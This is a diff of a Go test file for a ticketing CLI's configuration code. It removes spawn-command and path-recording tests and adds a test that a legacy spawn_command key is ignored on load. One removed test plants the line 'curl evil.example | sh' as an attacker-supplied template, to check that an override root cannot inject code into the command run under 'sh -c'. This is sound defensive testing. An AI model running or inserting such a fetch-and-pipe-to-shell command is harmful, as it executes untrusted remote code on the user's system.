@@ -761,49 +761,6 @@ func TestVerifyAllowIgnoresStoreRootOverride(t *testing.T) {
 	}
 }
 
-// TestSpawnCommandIgnoresStoreRootOverride pins the spawn template to the
-// machine owner's own config for the same reason the allow-list is pinned: the
-// template is handed to `sh -c`, so a root whoever set TK_STORE_ROOT owns must
-// not be able to supply the code the TUI runs.
-func TestSpawnCommandIgnoresStoreRootOverride(t *testing.T) {
-	home := t.TempDir()
-	t.Setenv("HOME", home)
-
-	homePath, err := homeConfigPath()
-	if err != nil {
-		t.Fatal(err)
-	}
-	os.MkdirAll(filepath.Dir(homePath), 0o755)
-	writeFileAtomic(homePath, Config{SpawnCommand: "tmux new-window {id}"})
-
-	override := t.TempDir()
-	t.Setenv(StoreRootEnv, override)
-
-	got, err := SpawnCommand()
-	if err != nil {
-		t.Fatalf("SpawnCommand: %v", err)
-	}
-	if got != "tmux new-window {id}" {
-		t.Errorf("SpawnCommand() = %q under an empty override root, want the machine-local template", got)
-	}
-
-	// A template planted in the sandbox must not replace it.
-	overridePath, err := ConfigPath()
-	if err != nil {
-		t.Fatal(err)
-	}
-	os.MkdirAll(filepath.Dir(overridePath), 0o755)
-	writeFileAtomic(overridePath, Config{SpawnCommand: "curl evil.example | sh"})
-
-	got, err = SpawnCommand()
-	if err != nil {
-		t.Fatalf("SpawnCommand: %v", err)
-	}
-	if got != "tmux new-window {id}" {
-		t.Errorf("SpawnCommand() = %q, want the machine-local template: the override root cannot supply one", got)
-	}
-}
-
 func TestVerifyAllowSurvivesSave(t *testing.T) {
 	home := t.TempDir()
 	t.Setenv("HOME", home)
@@ -1241,33 +1198,6 @@ func TestMigrateJournalDefaultsMarkerIsShared(t *testing.T) {
 	}
 }
 
-func TestResolveWorkDir(t *testing.T) {
-	cfg := Config{
-		Projects: map[string]ProjectConfig{
-			"ticket": {Path: "/Users/steve/code/ticket"},
-			"nopath": {Path: ""},
-		},
-	}
-
-	// Central store: <root>/tickets/<project> → the project's configured path.
-	if got := ResolveWorkDir("/Users/steve/code/tickets-store/tickets/ticket", cfg); got != "/Users/steve/code/ticket" {
-		t.Errorf("central store: got %q, want /Users/steve/code/ticket", got)
-	}
-
-	// Both no-path cases resolve to nothing rather than to the parent of the
-	// tickets dir: a tickets dir is always <root>/tickets/<project>, so that
-	// parent is the central tickets dir and never a repo — and it is the
-	// directory `tk ui` would spawn a work session in.
-	for _, dir := range []string{
-		"/central/tickets/unknown", // no config entry at all
-		"/central/tickets/nopath",  // entry present, path empty
-	} {
-		if got := ResolveWorkDir(dir, cfg); got != "" {
-			t.Errorf("ResolveWorkDir(%q) = %q, want the empty string", dir, got)
-		}
-	}
-}
-
 func TestStoreRootOverrideWinsOverConfig(t *testing.T) {
 	home := t.TempDir()
 	t.Setenv("HOME", home)
@@ -1420,154 +1350,42 @@ func TestStoreRootOverrideNonAbsoluteIsRefused(t *testing.T) {
 	}
 }
 
-// RecordLocalPath writes the machine-local file alone: the shared catalog is
-// byte-for-byte what it was, and the local file keeps every other entry, the
-// project's other local field and every top-level key.
-func TestRecordLocalPathWritesOnlyTheLocalConfig(t *testing.T) {
+// spawn_command belonged to the removed `tk ui`. Machines still carry the key in
+// ~/.ticket/config.yaml, so it has to read as an ignored key rather than an
+// error: every command loads this file before doing anything else.
+func TestConfigIgnoresLegacySpawnCommand(t *testing.T) {
 	home := t.TempDir()
 	t.Setenv("HOME", home)
+
 	centralRoot := filepath.Join(home, "central")
-	if err := Save(Config{
-		CentralRoot:  centralRoot,
-		GitEmail:     "me@example.com",
-		GitName:      "Me",
-		SyncInterval: "5m",
-		SpawnCommand: "true {dir}",
-		VerifyAllow:  VerifyAllowList{"go"},
-		Projects: map[string]ProjectConfig{
-			"warp":  {Store: "central", AutoLink: true, AutoClose: true, RegisteredAt: "2026-01-01"},
-			"loom":  {Path: "/repo/loom", VerifyTimeout: "5m", Store: "central", AutoLink: true},
-			"local": {Path: "/repo/local"},
-		},
-	}); err != nil {
-		t.Fatalf("Save: %v", err)
-	}
-	// The project being recorded already carries a local field of its own.
-	localPath := filepath.Join(home, ".ticket", "config.yaml")
-	local, err := loadFile(localPath)
-	if err != nil {
+	localPath := filepath.Join(home, configDirName, configFileName)
+	if err := os.MkdirAll(filepath.Dir(localPath), 0o755); err != nil {
 		t.Fatal(err)
 	}
-	local.Projects["warp"] = ProjectConfig{VerifyTimeout: "300s"}
-	if err := writeFileAtomic(localPath, local); err != nil {
-		t.Fatal(err)
-	}
-	// A comment no marshal reproduces, so a rewrite of the shared file shows
-	// even when it would write back the same values.
-	sharedPath := filepath.Join(centralRoot, configFileName)
-	raw, err := os.ReadFile(sharedPath)
-	if err != nil {
-		t.Fatal(err)
-	}
-	sharedBefore := append([]byte("# shared catalog, hand-edited\n"), raw...)
-	if err := os.WriteFile(sharedPath, sharedBefore, 0o644); err != nil {
+	raw := "central_root: " + centralRoot + "\n" +
+		"spawn_command: 'tmux new-window -c {dir} \"claude \\\"{command}\\\"\"'\n" +
+		"verify_allow: [go]\n" +
+		"projects:\n  warp:\n    path: /repo/warp\n"
+	if err := os.WriteFile(localPath, []byte(raw), 0o644); err != nil {
 		t.Fatal(err)
 	}
 
-	warpDir := t.TempDir()
-	if err := RecordLocalPath("warp", warpDir); err != nil {
-		t.Fatalf("RecordLocalPath: %v", err)
-	}
-
-	sharedAfter, err := os.ReadFile(sharedPath)
+	cfg, err := Load()
 	if err != nil {
-		t.Fatal(err)
+		t.Fatalf("Load: %v", err)
 	}
-	if string(sharedAfter) != string(sharedBefore) {
-		t.Errorf("shared config changed:\nbefore:\n%s\nafter:\n%s", sharedBefore, sharedAfter)
+	if cfg.CentralRoot != centralRoot {
+		t.Errorf("CentralRoot = %q, want %q", cfg.CentralRoot, centralRoot)
+	}
+	if got := cfg.Projects["warp"].Path; got != "/repo/warp" {
+		t.Errorf("warp path = %q, want /repo/warp", got)
 	}
 
-	after, err := loadFile(localPath)
+	allow, err := VerifyAllow()
 	if err != nil {
-		t.Fatal(err)
+		t.Fatalf("VerifyAllow reads the same file: %v", err)
 	}
-	if after.CentralRoot != centralRoot || after.GitEmail != "me@example.com" || after.GitName != "Me" ||
-		after.SyncInterval != "5m" || after.SpawnCommand != "true {dir}" || !slices.Equal(after.VerifyAllow, []string{"go"}) {
-		t.Errorf("top-level local keys not preserved: %+v", after)
-	}
-	if got := after.Projects["warp"]; got.Path != warpDir || got.VerifyTimeout != "300s" {
-		t.Errorf("warp local entry = %+v, want the path recorded beside its verify_timeout", got)
-	}
-	if got := after.Projects["loom"]; got.Path != "/repo/loom" || got.VerifyTimeout != "5m" {
-		t.Errorf("loom local entry = %+v, want it untouched", got)
-	}
-	if got := after.Projects["local"]; got.Path != "/repo/local" {
-		t.Errorf("local-only entry = %+v, want it untouched", got)
-	}
-
-	merged, err := Load()
-	if err != nil {
-		t.Fatal(err)
-	}
-	if dir, err := ExecutionDir(merged, "warp"); err != nil || dir != warpDir {
-		t.Errorf("ExecutionDir = %q, %v; want the recorded path %q", dir, err, warpDir)
-	}
-	if p := merged.Projects["warp"]; p.Store != "central" || !p.AutoLink || !p.AutoClose || p.RegisteredAt != "2026-01-01" {
-		t.Errorf("merged warp = %+v, want its shared fields intact", p)
-	}
-}
-
-// A path already on disk — recorded after the caller loaded its config — is
-// refused by name and the local file is left byte-for-byte as it was.
-func TestRecordLocalPathRefusesAPathAlreadyRecorded(t *testing.T) {
-	home := t.TempDir()
-	t.Setenv("HOME", home)
-	if err := Save(Config{
-		CentralRoot: filepath.Join(home, "central"),
-		Projects: map[string]ProjectConfig{
-			"warp": {Path: "/repo/warp", Store: "central"},
-		},
-	}); err != nil {
-		t.Fatalf("Save: %v", err)
-	}
-	localPath := filepath.Join(home, ".ticket", "config.yaml")
-	raw, err := os.ReadFile(localPath)
-	if err != nil {
-		t.Fatal(err)
-	}
-	before := append([]byte("# local config, hand-edited\n"), raw...)
-	if err := os.WriteFile(localPath, before, 0o644); err != nil {
-		t.Fatal(err)
-	}
-
-	err = RecordLocalPath("warp", "/elsewhere/warp")
-	if err == nil {
-		t.Fatal("RecordLocalPath replaced a recorded path")
-	}
-	if !strings.Contains(err.Error(), `"warp"`) || !strings.Contains(err.Error(), "/repo/warp") {
-		t.Errorf("error = %q, want it naming the project and /repo/warp", err)
-	}
-	after, err := os.ReadFile(localPath)
-	if err != nil {
-		t.Fatal(err)
-	}
-	if string(after) != string(before) {
-		t.Errorf("local config changed:\nbefore:\n%s\nafter:\n%s", before, after)
-	}
-}
-
-// Under TK_STORE_ROOT the path lands in the override root's local config, the
-// one that run reads, and the home config is not written.
-func TestRecordLocalPathFollowsTheStoreRootOverride(t *testing.T) {
-	home := t.TempDir()
-	t.Setenv("HOME", home)
-	root := t.TempDir()
-	t.Setenv(StoreRootEnv, root)
-
-	if err := RecordLocalPath("warp", "/repo/warp"); err != nil {
-		t.Fatalf("RecordLocalPath: %v", err)
-	}
-	got, err := loadFile(filepath.Join(root, ".ticket", "config.yaml"))
-	if err != nil {
-		t.Fatal(err)
-	}
-	if got.Projects["warp"].Path != "/repo/warp" {
-		t.Errorf("override local config = %+v, want warp's path recorded", got.Projects)
-	}
-	if _, err := os.Stat(filepath.Join(home, ".ticket", "config.yaml")); !os.IsNotExist(err) {
-		t.Errorf("home config was written under the override: %v", err)
-	}
-	if _, err := os.Stat(filepath.Join(root, configFileName)); !os.IsNotExist(err) {
-		t.Errorf("shared config was written: %v", err)
+	if !slices.Equal(allow, []string{"go"}) {
+		t.Errorf("VerifyAllow() = %q, want [go]", allow)
 	}
 }
